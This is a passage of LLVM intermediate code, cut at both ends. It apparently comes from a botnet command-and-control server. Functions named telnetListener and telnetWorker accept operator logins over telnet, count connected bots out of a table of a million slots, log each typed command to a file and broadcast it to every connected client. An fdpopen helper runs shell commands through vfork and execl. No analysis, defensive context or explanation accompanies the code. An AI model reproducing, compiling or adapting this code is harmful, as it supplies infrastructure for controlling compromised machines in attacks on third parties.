259:                                              ; preds = %258, %182, %55
  %260 = load i32, i32* %7, align 4
  %261 = add nsw i32 %260, 1
  store i32 %261, i32* %7, align 4
  br label %24, !llvm.loop !14

262:                                              ; preds = %24
  br label %20
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #4

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @printf(i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdpopen(i8* %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

19:                                               ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

25:                                               ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

26:                                               ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %28 = call i32 @pipe(i32* %27) #11
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

31:                                               ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

34:                                               ; preds = %31
  %35 = call i32 @getdtablesize() #11
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

37:                                               ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

38:                                               ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias align 16 i8* @malloc(i64 %43) #11
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

47:                                               ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

48:                                               ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* align 1 %50, i8 0, i64 %53, i1 false)
  br label %54

54:                                               ; preds = %48, %31
  %55 = call i32 @vfork() #13
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

56:                                               ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

63:                                               ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

68:                                               ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

72:                                               ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #11
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

79:                                               ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

83:                                               ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

87:                                               ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #11
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

94:                                               ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

98:                                               ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0), i8* %99, i8* null) #11
  call void @_exit(i32 127) #14
  unreachable

101:                                              ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

106:                                              ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

112:                                              ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

118:                                              ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

125:                                              ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #3

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #3

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdpclose(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %9 = load i32*, i32** @fdopen_pids, align 8
  %10 = icmp eq i32* %9, null
  br i1 %10, label %18, label %11

11:                                               ; preds = %1
  %12 = load i32*, i32** @fdopen_pids, align 8
  %13 = load i32, i32* %3, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i32, i32* %12, i64 %14
  %16 = load i32, i32* %15, align 4
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %19

18:                                               ; preds = %11, %1
  store i32 -1, i32* %2, align 4
  br label %58

19:                                               ; preds = %11
  %20 = load i32, i32* %3, align 4
  %21 = call i32 @close(i32 %20)
  %22 = call i32 @sigemptyset(%struct.__sigset_t* %6) #11
  %23 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #11
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #11
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #11
  %26 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #11
  br label %27

27:                                               ; preds = %41, %19
  %28 = load i32*, i32** @fdopen_pids, align 8
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i32, i32* %28, i64 %30
  %32 = load i32, i32* %31, align 4
  %33 = call i32 (i32, i32*, i32, ...) bitcast (i32 (...)* @waitpid to i32 (i32, i32*, i32, ...)*)(i32 %32, i32* %7, i32 0)
  store i32 %33, i32* %8, align 4
  br label %34

34:                                               ; preds = %27
  %35 = load i32, i32* %8, align 4
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %37, label %41

37:                                               ; preds = %34
  %38 = call i32* @__errno_location() #12
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 4
  br label %41

41:                                               ; preds = %37, %34
  %42 = phi i1 [ false, %34 ], [ %40, %37 ]
  br i1 %42, label %27, label %43, !llvm.loop !16

43:                                               ; preds = %41
  %44 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #11
  %45 = load i32*, i32** @fdopen_pids, align 8
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i32, i32* %45, i64 %47
  store i32 0, i32* %48, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %43
  br label %56

52:                                               ; preds = %43
  %53 = load i32, i32* %7, align 4
  %54 = and i32 %53, 65280
  %55 = ashr i32 %54, 8
  br label %56

56:                                               ; preds = %52, %51
  %57 = phi i32 [ -1, %51 ], [ %55, %52 ]
  store i32 %57, i32* %2, align 4
  br label %58

58:                                               ; preds = %56, %18
  %59 = load i32, i32* %2, align 4
  ret i32 %59
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #3

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #3

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #3

declare i32 @waitpid(...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.args*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca [2048 x i8], align 16
  %9 = alloca [2048 x i8], align 16
  %10 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %11 = load i8*, i8** %3, align 8
  %12 = bitcast i8* %11 to %struct.args*
  store %struct.args* %12, %struct.args** %4, align 8
  %13 = load %struct.args*, %struct.args** %4, align 8
  %14 = getelementptr inbounds %struct.args, %struct.args* %13, i32 0, i32 0
  %15 = load i32, i32* %14, align 4
  store i32 %15, i32* %5, align 4
  %16 = load volatile i32, i32* @managesConnected, align 4
  %17 = add nsw i32 %16, 1
  store volatile i32 %17, i32* @managesConnected, align 4
  %18 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %18, i8 0, i64 2048, i1 false)
  %19 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %19, i8 0, i64 2048, i1 false)
  %20 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %20, i8 0, i64 2048, i1 false)
  %21 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %21, i8 0, i64 2048, i1 false)
  %22 = load i32, i32* %5, align 4
  %23 = call i64 @send(i32 %22, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.12, i64 0, i64 0), i64 0, i32 16384)
  %24 = icmp eq i64 %23, -1
  br i1 %24, label %25, label %26

25:                                               ; preds = %1
  br label %99

26:                                               ; preds = %1
  %27 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %28 = load i32, i32* %5, align 4
  %29 = call i32 @fdgets(i8* %27, i32 2048, i32 %28)
  %30 = icmp slt i32 %29, 1
  br i1 %30, label %31, label %32

31:                                               ; preds = %26
  br label %99

32:                                               ; preds = %26
  %33 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %33)
  %34 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %35 = call i32 @strcmp(i8* %34, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i64 0, i64 0)) #10
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %37, label %38

37:                                               ; preds = %32
  br label %99

38:                                               ; preds = %32
  %39 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %39, i8 0, i64 2048, i1 false)
  %40 = load i32, i32* %5, align 4
  %41 = call i64 @send(i32 %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i64 0, i64 0), i64 4, i32 16384)
  %42 = icmp eq i64 %41, -1
  br i1 %42, label %43, label %44

43:                                               ; preds = %38
  br label %99

44:                                               ; preds = %38
  %45 = load i32, i32* %5, align 4
  %46 = call i64 @send(i32 %45, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.15, i64 0, i64 0), i64 23, i32 16384)
  %47 = icmp eq i64 %46, -1
  br i1 %47, label %48, label %49

48:                                               ; preds = %44
  br label %99

49:                                               ; preds = %44
  %50 = load i32, i32* %5, align 4
  %51 = call i64 @send(i32 %50, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i64 0, i64 0), i64 3, i32 16384)
  %52 = icmp eq i64 %51, -1
  br i1 %52, label %53, label %54

53:                                               ; preds = %49
  br label %99

54:                                               ; preds = %49
  br label %55

55:                                               ; preds = %88, %87, %54
  %56 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %57 = load i32, i32* %5, align 4
  %58 = call i32 @fdgets(i8* %56, i32 2048, i32 %57)
  %59 = icmp sgt i32 %58, 0
  br i1 %59, label %60, label %98

60:                                               ; preds = %55
  %61 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %62 = call i8* @strstr(i8* %61, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.17, i64 0, i64 0)) #10
  %63 = icmp ne i8* %62, null
  br i1 %63, label %64, label %77

64:                                               ; preds = %60
  %65 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %66 = call i32 @clientsConnected()
  %67 = load volatile i32, i32* @managesConnected, align 4
  %68 = call i32 (i8*, i8*, ...) @sprintf(i8* %65, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.18, i64 0, i64 0), i32 %66, i32 %67) #11
  %69 = load i32, i32* %5, align 4
  %70 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %71 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %72 = call i64 @strlen(i8* %71) #10
  %73 = call i64 @send(i32 %69, i8* %70, i64 %72, i32 16384)
  %74 = icmp eq i64 %73, -1
  br i1 %74, label %75, label %76

75:                                               ; preds = %64
  store i8* null, i8** %2, align 8
  br label %108

76:                                               ; preds = %64
  br label %77

77:                                               ; preds = %76, %60
  %78 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %78)
  %79 = load i32, i32* %5, align 4
  %80 = call i64 @send(i32 %79, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i64 0, i64 0), i64 3, i32 16384)
  %81 = icmp eq i64 %80, -1
  br i1 %81, label %82, label %83

82:                                               ; preds = %77
  br label %99

83:                                               ; preds = %77
  %84 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %85 = call i64 @strlen(i8* %84) #10
  %86 = icmp eq i64 %85, 0
  br i1 %86, label %87, label %88

87:                                               ; preds = %83
  br label %55, !llvm.loop !17

88:                                               ; preds = %83
  %89 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i64 0, i64 0))
  store %struct._IO_FILE* %89, %struct._IO_FILE** %10, align 8
  %90 = load %struct._IO_FILE*, %struct._IO_FILE** %10, align 8
  %91 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %92 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %90, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.21, i64 0, i64 0), i8* %91)
  %93 = load %struct._IO_FILE*, %struct._IO_FILE** %10, align 8
  %94 = call i32 @fclose(%struct._IO_FILE* %93)
  %95 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %96 = load i32, i32* %5, align 4
  call void @broadcast(i8* %95, i32 %96)
  %97 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %97, i8 0, i64 2048, i1 false)
  br label %55, !llvm.loop !17

98:                                               ; preds = %55
  br label %99

99:                                               ; preds = %98, %82, %53, %48, %43, %37, %31, %25
  %100 = load i32, i32* %5, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %101
  %103 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32, i32* %5, align 4
  %105 = call i32 @close(i32 %104)
  %106 = load volatile i32, i32* @managesConnected, align 4
  %107 = add nsw i32 %106, -1
  store volatile i32 %107, i32* @managesConnected, align 4
  br label %108

108:                                              ; preds = %99, %75
  %109 = load i8*, i8** %2, align 8
  ret i8* %109
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.args, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %8 = call i32 @socket(i32 2, i32 1, i32 0) #11
  store i32 %8, i32* %3, align 4
  %9 = load i32, i32* %3, align 4
  %10 = icmp slt i32 %9, 0
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.22, i64 0, i64 0))
  br label %12

12:                                               ; preds = %11, %1
  %13 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %13, i8 0, i64 16, i1 false)
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 0, i32* %16, align 4
  %17 = load i32, i32* %2, align 4
  %18 = trunc i32 %17 to i16
  %19 = call zeroext i16 @htons(i16 zeroext %18) #12
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %19, i16* %20, align 2
  %21 = load i32, i32* %3, align 4
  %22 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %23 = call i32 @bind(i32 %21, %struct.sockaddr* %22, i32 16) #11
  %24 = icmp slt i32 %23, 0
  br i1 %24, label %25, label %26

25:                                               ; preds = %12
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.23, i64 0, i64 0))
  br label %26

26:                                               ; preds = %25, %12
  %27 = load i32, i32* %3, align 4
  %28 = call i32 @listen(i32 %27, i32 5) #11
  store i32 16, i32* %5, align 4
  br label %29

29:                                               ; preds = %26, %39
  %30 = load i32, i32* %3, align 4
  %31 = getelementptr inbounds %struct.args, %struct.args* %4, i32 0, i32 1
  %32 = bitcast %struct.sockaddr_in* %31 to %struct.sockaddr*
  %33 = call i32 @accept(i32 %30, %struct.sockaddr* %32, i32* %5)
  %34 = getelementptr inbounds %struct.args, %struct.args* %4, i32 0, i32 0
  store i32 %33, i32* %34, align 4
  %35 = getelementptr inbounds %struct.args, %struct.args* %4, i32 0, i32 0
  %36 = load i32, i32* %35, align 4
  %37 = icmp slt i32 %36, 0
  br i1 %37, label %38, label %39

38:                                               ; preds = %29
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.24, i64 0, i64 0))
  br label %39

39:                                               ; preds = %38, %29
  %40 = bitcast %struct.args* %4 to i8*
  %41 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %40) #11
  br label %29
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #4

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.epoll_event, align 1
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #11
  %13 = load i8**, i8*** %5, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 3
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 @atoi(i8* %15) #10
  store i32 %16, i32* %8, align 4
  %17 = load i32, i32* %4, align 4
  %18 = icmp ne i32 %17, 4
  br i1 %18, label %19, label %25

19:                                               ; preds = %2
  %20 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %20, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.25, i64 0, i64 0), i8* %23)
  call void @exit(i32 1) #15
  unreachable

25:                                               ; preds = %2
  store %struct._IO_FILE* null, %struct._IO_FILE** @fileFD, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 2
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @atoi(i8* %28) #10
  store i32 %29, i32* %7, align 4
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 @create_and_bind(i8* %32)
  store volatile i32 %33, i32* @listenFD, align 4
  %34 = load volatile i32, i32* @listenFD, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

36:                                               ; preds = %25
  call void @abort() #15
  unreachable

37:                                               ; preds = %25
  %38 = load volatile i32, i32* @listenFD, align 4
  %39 = call i32 @make_socket_non_blocking(i32 %38)
  store i32 %39, i32* %6, align 4
  %40 = load i32, i32* %6, align 4
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

42:                                               ; preds = %37
  call void @abort() #15
  unreachable

43:                                               ; preds = %37
  %44 = load volatile i32, i32* @listenFD, align 4
  %45 = call i32 @listen(i32 %44, i32 4096) #11
  store i32 %45, i32* %6, align 4
  %46 = load i32, i32* %6, align 4
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %48, label %49

48:                                               ; preds = %43
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.26, i64 0, i64 0))
  call void @abort() #15
  unreachable

49:                                               ; preds = %43
  %50 = call i32 @epoll_create1(i32 0) #11
  store volatile i32 %50, i32* @epollFD, align 4
  %51 = load volatile i32, i32* @epollFD, align 4
  %52 = icmp eq i32 %51, -1
  br i1 %52, label %53, label %54

53:                                               ; preds = %49
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.27, i64 0, i64 0))
  call void @abort() #15
  unreachable

54:                                               ; preds = %49
  %55 = load volatile i32, i32* @listenFD, align 4
  %56 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %9, i32 0, i32 1
  %57 = bitcast %union.epoll_data* %56 to i32*
